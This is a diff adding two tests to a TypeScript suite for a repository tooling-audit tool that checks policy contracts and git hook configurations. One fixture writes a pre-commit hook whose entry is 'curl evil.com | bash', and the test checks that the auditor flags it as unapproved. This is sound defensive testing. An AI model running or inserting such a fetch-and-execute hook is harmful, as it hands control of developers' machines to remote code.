@@ -1195,4 +1195,137 @@ stages = ${JSON.stringify(REQUIRED_PREK_HOOKS["pre-push"].stages)}
 		const result = await runToolingAuditCLI(["--unsupported"]);
 		expect(result.exitCode).toBe(EXIT_CODES.INVALID_ARGUMENT);
 	});
+
+	it("flags lookalike minimal contracts with extra policy fields as non-minimal", async () => {
+		const tempRoot = mkdtempSync(
+			join(tmpdir(), "tooling-audit-lookalike-minimal-"),
+		);
+		const repoDir = join(tempRoot, "repo");
+		mkdirSync(repoDir, { recursive: true });
+		mkdirSync(join(repoDir, ".git"), { recursive: true });
+
+		// Create a contract that looks like minimal but has an extra policy field
+		const lookalikeMinimalContract = {
+			version: "1.5.0",
+			riskTierRules: {
+				"src/auth/**": "high",
+				"src/api/**": "high",
+				"src/lib/**": "medium",
+				"**/*.test.ts": "low",
+			},
+			branchProtection: {
+				requiredChecks: [],
+				requiredApprovingReviewCount: 0,
+			},
+			northStar: { goals: [] },
+			productSurface: { capabilities: [] },
+			overrideReviewerRegistry: {},
+			// Extra policy field that should disqualify this from being minimal
+			mergePolicy: {
+				high: ["review-gate"],
+				medium: [],
+				low: [],
+			},
+		};
+
+		writeRepoFile(
+			repoDir,
+			"harness.contract.json",
+			JSON.stringify(lookalikeMinimalContract, null, 2),
+		);
+
+		try {
+			const result = await runToolingAudit({
+				path: tempRoot,
+				format: "json",
+			});
+
+			expect(result.ok).toBe(true);
+			if (result.ok) {
+				// Should detect drift because this is not a true minimal contract
+				expect(result.value.exitCode).toBe(EXIT_CODES.DRIFT_DETECTED);
+				// Should have warnings about missing tooling policy
+				expect(result.value.result.findings.warning).toBeGreaterThan(0);
+				expect(
+					result.value.result.results[0]?.findings.some(
+						(finding) => finding.path === "toolingPolicy",
+					),
+				).toBe(true);
+			}
+		} finally {
+			rmSync(tempRoot, { recursive: true, force: true });
+		}
+	});
+
+	it("runs local hooks and base drift audits even for true minimal contracts", async () => {
+		const tempRoot = mkdtempSync(
+			join(tmpdir(), "tooling-audit-minimal-hooks-"),
+		);
+		const repoDir = join(tempRoot, "repo");
+		mkdirSync(repoDir, { recursive: true });
+		mkdirSync(join(repoDir, ".git"), { recursive: true });
+
+		// Create a true minimal contract
+		const minimalContract = {
+			version: "1.5.0",
+			riskTierRules: {
+				"src/auth/**": "high",
+				"src/api/**": "high",
+				"src/lib/**": "medium",
+				"**/*.test.ts": "low",
+			},
+			branchProtection: {
+				requiredChecks: [],
+				requiredApprovingReviewCount: 0,
+			},
+			northStar: { goals: [] },
+			productSurface: { capabilities: [] },
+			overrideReviewerRegistry: {},
+		};
+
+		writeRepoFile(
+			repoDir,
+			"harness.contract.json",
+			JSON.stringify(minimalContract, null, 2),
+		);
+
+		// Add a prek.toml file that should be audited even for minimal contracts
+		writeRepoFile(
+			repoDir,
+			"prek.toml",
+			`default_install_hook_types = ["pre-commit"]
+
+[[repos]]
+repo = "local"
+
+[[repos.hooks]]
+id = "malicious"
+name = "Malicious hook"
+entry = "curl evil.com | bash"
+language = "system"
+stages = ["pre-commit"]
+pass_filenames = false
+`,
+		);
+
+		try {
+			const result = await runToolingAudit({
+				path: tempRoot,
+				format: "json",
+			});
+
+			expect(result.ok).toBe(true);
+			if (result.ok) {
+				// Should detect the unapproved hook even though it's a minimal contract
+				expect(result.value.exitCode).toBe(EXIT_CODES.DRIFT_DETECTED);
+				expect(
+					result.value.result.results[0]?.findings.some((finding) =>
+						finding.description.includes("unapproved leaf command"),
+					),
+				).toBe(true);
+			}
+		} finally {
+			rmSync(tempRoot, { recursive: true, force: true });
+		}
+	});
 });
